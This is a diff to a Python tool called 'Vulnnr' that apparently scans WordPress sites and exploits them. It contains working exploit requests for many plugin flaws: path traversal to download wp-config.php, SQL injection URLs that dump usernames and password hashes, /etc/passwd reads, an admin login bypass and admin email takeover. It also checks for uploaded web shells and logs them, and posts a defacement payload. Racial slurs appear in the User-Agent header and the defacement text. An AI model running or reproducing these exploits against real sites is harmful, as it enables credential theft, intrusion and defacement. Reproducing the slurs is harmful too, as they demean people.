@@ -11,12 +11,13 @@ YELLOW = Fore.YELLOW
 GREEN  = Fore.GREEN
 RED = Fore.RED
 LIGHTRED = Fore.LIGHTRED_EX
-PURPLE = Fore.MAGENTA
+PURPLE = Fore.LIGHTMAGENTA_EX
 RESET = Fore.RESET
 CYAN = Fore.CYAN
 now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
+Version = "v1.0"
 
 HEADERS = {
     'User-Agent': 'NiggerPenis-WIN!10',
@@ -28,19 +29,32 @@ HEADERS = {
 
 def banner():
     os.system("cls;clear")
-    print(f"""
-            {YELLOW}______________________________\n
-                   {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]  \n
-               {YELLOW} [ {RED}~ {CYAN}Creator Nano {RED}~ {YELLOW}]   \n    
-                   {YELLOW} [ {RED}~ {CYAN}V 1.0 {RED}~ {YELLOW}]      
-            ______________________________
-                 {RESET}Try the help command {RED}!{RESET}
+    #print(f"""
+            #{YELLOW}______________________________\n
+             #      {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]  \n
+            #   {YELLOW} [ {RED}~ {CYAN}Creator Nano {RED}~ {YELLOW}]   \n    
+           #        {YELLOW} [ {RED}~ {CYAN}V 1.0 {RED}~ {YELLOW}]      
+          #  ______________________________
+         #        {RESET}Try the help command {RED}!{RESET}
                                                                   
     
     
-    """)
+    #""")
     
+    print(f""" 
+     {GREEN},_,{PURPLE}        .       .   .   
+    {GREEN}(O,O){PURPLE}        \     /    |  
+    {GREEN}(   ){PURPLE}         \   /.  . | .--. .--. .--. {RED} ~ {RESET}Creator: {GREEN}Nano{PURPLE}
+    {RESET}-{GREEN}"-"{RESET}----{PURPLE}       \ / |  | | |  | |  | |    {RED} ~ {RESET}Version: {GREEN}{Version}{PURPLE}
+                    '  `--`-`-'  `-'  `-'  
+    
+    """)
+
+
+
+ 
 banner()
+
 dirs = [
     '/wp-content/wpclone-temp/wpclone_backup/',
     '/wp-config2.txt',
@@ -55,6 +69,17 @@ dirs = [
     '/wp-content/wpbackitup_backups',
     '/backup',
     'wp-login.php',
+    '/wp-json/wp/v2/users/',
+    '/wp-config.php.save',
+    '/wp-config.php_bak',
+    '/wp-config.save',
+    '/connectors/resource/s_eval.php',
+    '/vendor/phpunit/phpunit/build.xml',
+    '/wp-content/vendor/phpunit/phpunit/build.xml',
+    '/wp-admin/setup-config.php?step=0',
+    '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media',
+    '/wp-admin/setup-config.php'
+
 ]
 
 DowloadConfig = [
@@ -89,7 +114,10 @@ DowloadConfig = [
  '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/wp/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
- '/.env']
+ '/.env',
+ '']
+
+
 
 def config(url, path):
     Exp = url + str(path)
@@ -102,14 +130,14 @@ def config(url, path):
                 #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                 f.write(f"\nDB RESULTS:\n{GetConfig.text}\n")
             f.close()
-            print(f"{RED}~{RESET} wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
         elif "DB_HOST" in GetConfig.text:
 
             with io.open(filename, "a+", encoding="utf-8") as f:
                 #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                 f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
             f.close()
-            print(f"{RED}~{RESET} Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
 
 
 
@@ -122,7 +150,7 @@ def dirsscan(url, path):
             #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
             f.write(f"\n\n\nDIRSCAN: {GetConfig.url}\n\n\n")
         f.close()
-        print(f"{RED}~ {RESET}Found {GREEN}{GetConfig.url}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
         
     
 
@@ -179,7 +207,7 @@ def wp_thumbnailSlider(url):
             fname = re.findall(re.compile(r'/slider\/(.*\.gif)/'), upload_file)
             if fname:
                 dump_data = url + "wp-content/uploads/wp-responsive-images-thumbnail-slider/"+fname
-                print(f"{RED}~ {RESET}thumbnailslider Upload = {GREEN}Vuln")
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}thumbnailslider Upload {PURPLE}=> {GREEN}Vuln")
                 return dict(
                     url=url,
                     name="Thumbnail Slider",
@@ -187,19 +215,31 @@ def wp_thumbnailSlider(url):
                     shell=dump_data
                 )
             else:
-                print(f"{RED}~ {RESET}thumbnailslider Upload = {RED}Not Vuln")
+                print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}thumbnailslider Upload {PURPLE}=> {RED}Not Vuln")
                 return dict(
                     url=url,
                     name="Thumbnail Slider",
                     status=False
                 )
 
+
+def autoadmin(url):
+    exploit = '/?up_auto_log=true'
+    admin_re_page = url + '/wp-admin/'
+    sess.get(url + exploit, timeout=5, headers=HEADERS)
+    Check_login = sess.get(admin_re_page, timeout=10, headers=HEADERS)
+    if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}autoadmin {PURPLE}=> {GREEN}Vuln {RESET}| {url}{exploit} ")
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}autoadmin {PURPLE}=> {RED}Not Vuln")
+
+
 def Spreedsheet(url):
     test = requests.get(url+"/wp-content/plugins/wpSS/ss_load.php")
     if test.status_code == 200:
-        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
     else:  
-        print(f"{RED}~ {RESET}wpSS SQL = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}wpSS SQL {PURPLE}=> {RED}Not Vuln")
 
 def revexploit(url):
         exploit = requests.get(url + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
@@ -208,9 +248,9 @@ def revexploit(url):
             with open(filename, "a+") as f:
                 f.write(exploit.text)
             f.close()
-            print(f"{RED}~ {RESET}Revslider exploit = Database config has been saved to {GREEN}%s" % filename)
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Revslider exploit {PURPLE}=>{RESET} Database config has been saved to {GREEN}%s" % filename)
         else: # else any other HTTP reponse means site is not vulnerable!
-             print(f"{RED}~ {RESET}RevSlider exploit = {RED}Not Vuln")
+             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}RevSlider exploit {PURPLE}=> {RED}Not Vuln")
 
 def eshop(url):
         exploit = requests.get(url + "/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php")
@@ -219,9 +259,9 @@ def eshop(url):
             with open(filename, "a+") as f:
                 f.write(exploit.text)
             f.close()
-            print(f"{RED}~ {RESET}eshop exploit = Database config has been saved to {GREEN}%s" % filename)
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}eshop exploit {PURPLE}=>{RESET} Database config has been saved to {GREEN}%s" % filename)
         else: # else any other HTTP reponse means site is not vulnerable!
-             print(f"{RED}~ {RESET}eshop exploit = {RED}Not Vuln")
+             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}eshop exploit {PURPLE}=>{RESET} {RED}Not Vuln")
 
 
 
@@ -270,7 +310,7 @@ def wp_jobmanager(url):
         check_jobmanager = re.findall(regex, res)
         if check_jobmanager:
 
-            print(f"{RED}~ {RESET}Jobmanager Upload = {GREEN}Vuln")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Jobmanager Upload {PURPLE}=>{RESET} {GREEN}Vuln")
             filename = "Results/shells.txt"
             with open(filename, "a+") as f:
                 f.write(dump_data.url)
@@ -283,7 +323,7 @@ def wp_jobmanager(url):
                 shell=dump_data
             )
         else:
-            print(f"{RED}~ {RESET}Jobmanager Upload = {RED}Not Vuln")
+            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Jobmanager Upload {PURPLE}=>{RESET} {RED}Not Vuln")
             return dict(
                 url=url,
                 name="Job Manager     ",
@@ -298,9 +338,9 @@ def tutor(url):
             f.write(f"EXPLOIT: {test.url}\n\n")
             f.write(test.text)
         f.close()
-        print(f"{RED}~{RESET} tutor LFI = {GREEN}Vuln saved to {GREEN}" + filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}tutor LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
     else:
-        print(f"{RED}~{RESET} tutor LFI = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}tutor LFI {PURPLE}=>{RESET} {RED}Not Vuln")
 
 
 
@@ -312,9 +352,9 @@ def Localize(url):
             f.write(f"EXPLOIT: {test.url}\n\n")
             f.write(test.text)
         f.close()
-        print(f"{RED}~{RESET} Localize LFI = {GREEN}Vuln saved to {GREEN}" + filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
     else:
-        print(f"{RED}~{RESET} Localize LFI = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Localize LFI {PURPLE}=>{RESET} {RED}Not Vuln")
 
 
 
@@ -322,9 +362,9 @@ def Localize(url):
 def photog(url):
     test = requests.get(url+"/wp-content/plugins/photo-gallery")
     if test.status_code == 200:
-        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
     else:  
-        print(f"{RED}~ {RESET}photo-gallery SQL = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}photo-gallery SQL {PURPLE}=>{RESET} {RED}Not Vuln")
 
 def autosuggest(url):
     '''
@@ -332,10 +372,10 @@ def autosuggest(url):
     '''
     test = requests.get(url+"/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&")
     if test.status_code == 403:
-        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{test.url}?wpas_action=query&wpas_keys=1")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{test.url}?wpas_action=query&wpas_keys=1")
     else:
         
-        print(f"{RED}~ {RESET}autosuggest SQL = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}autosuggest SQL {PURPLE}=>{RESET} {RED}Not Vuln")
 
 
 def admintakeover(url):
@@ -350,10 +390,10 @@ def admintakeover(url):
         })
     GG = requests.post(url+"/wp-admin/admin-ajax.php", headers=HEADERS, data=payload)
     if '{"message":"","error":""}' in str(GG.content):
-        print(f"{RED} ~{RESET}admin_email_reset = {GREEN}Vuln{RESET} sent email to {CYAN}{email}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}admin_email_reset {PURPLE}=>{RESET} {GREEN}Vuln{RESET} sent email to {CYAN}{email}")
         pass
     else:
-        print(f"{RED} ~{RESET}admin_email_reset = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}admin_email_reset {PURPLE}=>{RESET} {RED}Not Vuln")
         pass
 
 
@@ -368,10 +408,10 @@ def wp_cherry(url):
         content = requests.get(dump_data,headers=HEADERS,verify=False).text
         check_cherry = re.findall("hateme", content)
         if check_cherry:
-            print(f"{RED}~ {RESET}Cherry Upload = {GREEN}Vuln")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {GREEN}Vuln")
             filename = "Results/shells.txt"
             with open(filename, "a+") as f:
-                f.write(dump_data.url)
+                f.write(content+content.url)
             f.close()
             return dict(
                 url=url,
@@ -380,7 +420,7 @@ def wp_cherry(url):
                 shell=dump_data
             )
         else:
-            print(f"{RED}~ {RESET}Cherry Upload = {RED}Not Vuln")
+            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {RED}Not Vuln")
             return dict(
                 url=url,
                 name="CherryFramework ",
@@ -402,7 +442,7 @@ def wp_blaze(url):
         if check_blaze:
             uploadfolder = check_blaze.group(1)
             dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/hateme.php?cmd=X"
-            print(f"{RED}~ {RESET}Blaze_manager = {GREEN}Vuln")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Blaze_manager {PURPLE}=>{RESET} {GREEN}Vuln")
             filename = "Results/shells.txt"
             with open(filename, "a+") as f:
                 f.write(dump_data.url)
@@ -414,7 +454,7 @@ def wp_blaze(url):
                 shell=dump_data
             )
         else:
-            print(f"{RED}~ {RESET}Blaze_manager = {RED}Not Vuln")
+            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Blaze_manager {PURPLE}=>{RESET} {RED}Not Vuln")
             
             return dict(
                 url=url,
@@ -431,9 +471,9 @@ def audioplayer(url):
             f.write(f"EXPLOIT: {test.url}\n\n")
             f.write(test.text)
         f.close()
-        print(f"{RED}~{RESET} audioplayer LFI = {GREEN}Vuln saved to {GREEN}" + filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}audioplayer LFI {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
     else:
-        print(f"{RED}~{RESET} audioplayer LFI = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}audioplayer LFI {PURPLE}=>{RESET} {RED}Not Vuln")
 
 def searchserver():
     '''
@@ -455,7 +495,7 @@ def wp_plugin(url):
             if plugin not in plugins_array:
                 plugins_array.append(plugin)
         for i in range(len(plugins_array)):
-            print(f"{RED}~ "+'%sPlugins : %s%s ' % (RESET, GREEN, plugins_array[i]))
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sPlugins : %s%s ' % (RESET, GREEN, plugins_array[i]))
 
 def wp_user(url):
     url + '/?author=1'
@@ -463,9 +503,9 @@ def wp_user(url):
     matches = re.search(re.compile(r'author/(\w+)?/'), getuser)
     if matches:
         user = matches.group(1)
-        return print(f"{RED}~ {RESET}"+'%sUser :%s %s' % (RESET, GREEN, user))
+        return print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sUser :%s %s' % (RESET, GREEN, user))
     else:
-        print(f"{RED}~ {RESET}Users: {RED}No Users{RESET}")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Users: {RED}No Users{RESET}")
 def wp_version(url):
     getversion = requests.get(url, headers=HEADERS).text
     # searching version content from the http response. \d{:digit} version form 0.0.0
@@ -473,9 +513,9 @@ def wp_version(url):
         r'content=\"WordPress (\d{0,9}.\d{0,9}.\d{0,9})?\"'), getversion)
     if matches:
         version = matches.group(1)
-        return print(f"{RED}~ "+'%sWordpress Version :%s %s' % (RESET, GREEN, version) + f"{RESET}")
+        return print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sWordpress Version :%s %s' % (RESET, GREEN, version) + f"{RESET}")
     else:
-        print(f"{RED}~ {RESET}Version: {RED}No Version{RESET}")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Version: {RED}No Version{RESET}")
 
 
 def wp_dirs(url):
@@ -487,7 +527,7 @@ def wp_dirs(url):
         url1 = dir1.url.replace("//", '/')
         pass
     if dir1.status_code == 200:
-        print(f"{RED}~ {RESET}Found {GREEN}{url1}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url1}")
         pass
     dir2 = requests.get(url+"/wp-admin/install")
     url2 = dir2.url
@@ -495,7 +535,7 @@ def wp_dirs(url):
         url2 = dir2.url.replace("//", '/')
         pass
     if dir2.status_code == 200:
-        print(f"{RED}~ {RESET}Found {GREEN}{url2}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}{RESET}Found {GREEN}{url2}")
         
     dir3 = requests.get(url+"/wp-register.php", headers=HEADERS)
    
@@ -509,7 +549,7 @@ def wp_dirs(url):
         pass
     else:
         if dir3.status_code == 200:
-            print(f"{RED}~ {RESET}Found {GREEN}{url3} {RESET}| {YELLOW}register.php might be enabled ")
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url3} {RESET}| {YELLOW}register.php might be enabled ")
         
         
     dir5 = requests.get(url+"/wp-content/themes/")
@@ -518,7 +558,7 @@ def wp_dirs(url):
         url5 = dir5.url.replace("//", '/')
         pass
     if dir5.status_code == 200:
-        print(f"{RED}~ {RESET}Found {GREEN}{url5}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url5}")
 
     dir6 = requests.get(url+"/wp-content/uploads/wp-backup-plus/")
     url6 = dir6.url
@@ -526,7 +566,7 @@ def wp_dirs(url):
         url6 = dir6.url.replace("//", '/')
         pass
     if dir6.status_code == 200:
-        print(f"{RED}~ {RESET}Found {GREEN}{url6} {RESET}| {YELLOW} Take alook!")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url6} {RESET}| {YELLOW} Take alook!")
     
     dir7 = requests.get(url+"/wp-content/uploads/wp-backup-plus-backups/")
     url7 = dir7.url
@@ -534,7 +574,7 @@ def wp_dirs(url):
         url7 = dir7.url.replace("//", '/')
         pass
     if dir7.status_code == 200:
-        print(f"{RED}~ {RESET}Found {GREEN}{url7} {RESET}| {YELLOW} Take alook!")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url7} {RESET}| {YELLOW} Take alook!")
         
 
 
@@ -542,13 +582,13 @@ def boldgrid(url):
     test = requests.get(url+"/wp-content/plugins/boldgrid-backup/cli/env-info.php")
     if test.status_code == 200:
         uwu = json.loads(test.text)
-        print(f"{RED}~ {RESET}boldgrid config ={GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}boldgrid config {PURPLE}=>{RESET}{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
         with open(filename, "a+") as f:
             f.write(f"\nhttp_host: {uwu['http_host']}\n server_addr: {uwu['']}\n username: {uwu['username']}\nphp_uname: {uwu['php_uname']}")
         f.close()
     else:
-        print(f"{RED}~ {RESET}boldgrid config = {RED} Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}boldgrid config {PURPLE}=>{RESET} {RED} Not Vuln")
 
 def spritz(url):
     test = requests.get(url+"wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd")
@@ -558,18 +598,18 @@ def spritz(url):
             f.write(f"EXPLOIT: {test.url}\n\n")
             f.write(test.text)
         f.close()
-        print(f"{RED}~ {RESET}spritz LFI ={GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}spritz LFI {PURPLE}=>{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
     else:
-        print(f"{RED}~ {RESET}spritz LFI = {RED} Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}spritz LFI {PURPLE}=>{RESET} {RED} Not Vuln")
 
 def soswaf(url):
     payload = "ls -la;whomai"
     test = requests.get(url+"wp-admin/admin-post.php?swp_debug=load_options&swp_url={payload}")
     if test.status_code == 500:
-        print(f"{RED}~ {RESET}Social Warfare = {GREEN}Vuln")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Social Warfare {PURPLE}=> {GREEN}Vuln")
         pass
     else:
-        print(f"{RED}~ {RESET}Social Warfare = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Social Warfare {PURPLE}=> {RED}Not Vuln")
         
 
 def lol(url):
@@ -580,9 +620,9 @@ def lol(url):
         with open(filename, "a+") as f:
             f.write(test.text)
         f.close()
-        print(f"{RED}~ {RESET}Site Editor = {GREEN}Vuln {RESET}results saved to {GREEN}"+filename)
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Site Editor {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}"+filename)
     else:
-        print(f"{RED}~ {RESET}Site Editor = {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Site Editor {PURPLE}=> {RED}Not Vuln")
 
 def wp_themes(url):
     themes_array = []
@@ -594,9 +634,9 @@ def wp_themes(url):
             if theme not in themes_array:
                 themes_array.append(theme)
         for i in range(len(themes_array)):
-            print(f"{RED}~ {RESET}"+'%sThemes :%s %s ' % (RESET, GREEN, themes_array[i]))
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}"+'%sThemes :%s %s ' % (RESET, GREEN, themes_array[i]))
     else:
-        print(f"{RED}~ {RESET}Themes: {RED}No Themes")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Themes: {RED}No Themes")
 
 def revslidercss(url):
     IndeXText = 'I Swear I Hate Niggers - VulnX'
@@ -605,49 +645,55 @@ def revslidercss(url):
     }
     test = requests.post(url+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css", data=ency, timeout=10, headers=HEADERS)
     if 'succesfully' in str(test.content):
-        print(f"{RED}~ {RESET}revslidercss = {GREEN} Vuln Deface here{RESET} {test.url}")
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}revslidercss {PURPLE}=> {GREEN} Vuln Deface here{RESET} {test.url}")
     else:
-        print(f"{RED}~ {RESET}revslidercss = {RED} Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}revslidercss {PURPLE}=> {RED} Not Vuln")
 
 
 def mailman():
-    user = input(f"Site{RED}:{RESET} ")
+    os.system("cls;clear")
+    banner()
+    user = input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Site {PURPLE} =>{RESET} ")
     try:
         cpanelcheck = requests.get(f"{user}/cpanel")
         init_time = time.time()
         if cpanelcheck.status_code == 200:
             pass
         else:
-            print(f"{RED}Does not Have a Cpanel Redirect")
+            print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RED}Error {PURPLE}=> {RESET}FDoes not Have a Cpanel Redirect")
             return main()
     except:
+        os.system("cls;clear")
+        banner()
         return main()
     try:
         now = requests.get(f"{user}/mailman/listinfo/mailman")
 
         output = subprocess.getoutput("curl "+user+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]
 
-        print(f"Backend{RED}: {RESET}{output.replace('/mailman/listinfo/mailman', '')}")
+        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {RESET}{output.replace('/mailman/listinfo/mailman', '')}")
         end_time = time.time()
         elapsed_time = end_time - init_time
-        print('%s[%s Elapsed Time %s]%s => %.2f seconds ' % (YELLOW,RESET,YELLOW,RESET,elapsed_time))
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Elapsed Time {PURPLE}=>{RESET}"+' %.2f seconds ' % (elapsed_time)+"\n")
 
         dn = output.replace('/mailman/listinfo/mailman', '').replace("https:/", '')
 
         dns = requests.get(f"http://ip-api.com/json/{dn}").text
-        print("\nWould u like to get info on the backend?")
-        usernext = input(f"Y/N{RED}: {RESET}")
-        if usernext == "Y":
+        print(f"\n {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Would u like to get info on the backend?\n")
+        usernext = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}y/n {PURPLE}=>  {RESET}")
+        if usernext == "y":
             pass
      
-        if usernext == "N":
+        elif usernext == "n":
+            print("")
             return main()
         
-        print(f"Backend Info{RED}: {RESET}\n" + dns.replace(",", '\n').replace('"', '',).replace('{', '').replace('}', '').replace(':', ': '))
+        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend Info{PURPLE} => {RESET}\n" + dns.replace(",", '\n').replace('"', '',).replace('{', '').replace('}', '').replace(':', ': '))
 
     #print(dns)
     except Exception as e:
-        
+        os.system("cls;clear")
+        banner()
         return main()
 
 
@@ -707,28 +753,28 @@ def auto(url):
     if "http" in url:
         pass
     else:
-        print(f"{YELLOW}[ {RED}~ {RESET} need to add https{RED}/{RESET}http {RESET}before the url {RED}~{RESET} {YELLOW}]{RESET}")
+        print(f" {PURPLE}[ {GREEN}~ {RESET} need to add https{GREEN}/{RESET}http {RESET}before the url {GREEN}~{RESET} {PURPLE}]{RESET}")
         return main()
 
     try:
-        print(f"\n{YELLOW}[ {RED}~ {RESET} Looking for CMS {RED}~{RESET} {YELLOW}]{RESET}")
+        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
         
         cms = serialize(url)
-        print(f"{RED}~ {RESET}CMS:{RESET}{GREEN} ", cms['name'])
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}]{RESET} CMS {PURPLE}=> {GREEN}", cms['name'])
         if "Wordpress" in cms['name']:
 
-            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting wpscan! {RED}~{RESET} {YELLOW}]{RESET}")
+            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting wpscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             
             wp_version(url)
             wp_user(url)
             wp_themes(url)
             wp_plugin(url)
-            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting Dirscan! {RED}~{RESET} {YELLOW}]{RESET}")
+            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             dirs2(url)
             wp_dirs(url)
             print("")
             Exploit(url)
-            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting vulnscan! {RED}~{RESET} {YELLOW}]{RESET}")
+            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             revslidercss(url)
             Spreedsheet(url)
             wp_blaze(url)
@@ -748,10 +794,10 @@ def auto(url):
             revexploit(url)
             audioplayer(url)
         else:
-            print(f"\n{YELLOW}[ {RED}~ {RESET} Could not detect CMS {RED}~{RESET} {YELLOW}]{RESET}\n")
-            print(f"{YELLOW}[ {RED}~ {RESET} Starting Dirscan! {RED}~{RESET} {YELLOW}]{RESET}")
+            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
-            return main()
+            
     except Exception as e:
         #print(e)
         pass
@@ -840,14 +886,21 @@ def portcheck():
 
 def xhelp():
     print("")
-    print(f"             {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]")
-    print(f"     {YELLOW}______________________________\n")
-    print(f"       {RED}~ {RESET}webvulns")
-    print(f"       {RED}~ {RESET}exploits\n")
-
-
-    print(f"     {YELLOW}______________________________\n")
+    print(f"""
+ {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}webvulns:\n
+    {PURPLE}[ {GREEN}1 {PURPLE}] {RESET}mailman {PURPLE}=> {RESET}Cloudssp exploit
+    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}wpscan {PURPLE}=> {RESET}Wordpress Scanner/exploiter
+    {PURPLE}[ {GREEN}3 {PURPLE}] {RESET}wpauto {PURPLE}=> {RESET}Wordpress Scanner/exploiter list
+    {PURPLE}[ {GREEN}4 {PURPLE}] {RESET}wpversion {PURPLE}=> {RESET}Wordpress Version Scanner
+    {PURPLE}[ {GREEN}5 {PURPLE}] {RESET}wpthemes {PURPLE}=> {RESET}Wordpress Theme Scanner
+    {PURPLE}[ {GREEN}6 {PURPLE}] {RESET}wpplugins {PURPLE}=> {RESET}Wordpress Plugins Scanner
+    
+ {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}others:\n
+    {PURPLE}[ {GREEN}1 {PURPLE}] {RESET}port {PURPLE}=> {RESET}Port Checker
+    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}domainscan {PURPLE}=> {RESET}Domain Scanner
+    """)
     return main()
+
 def main():
     
 
@@ -858,7 +911,8 @@ def main():
     try:
         dirpath = os.getcwd()
         foldername = os.path.basename(dirpath)
-        userinput = input(f"{RESET}{user}{YELLOW}@{CYAN}{host_name}:{RED}~{CYAN}/{foldername}{RED}$ {RESET}")
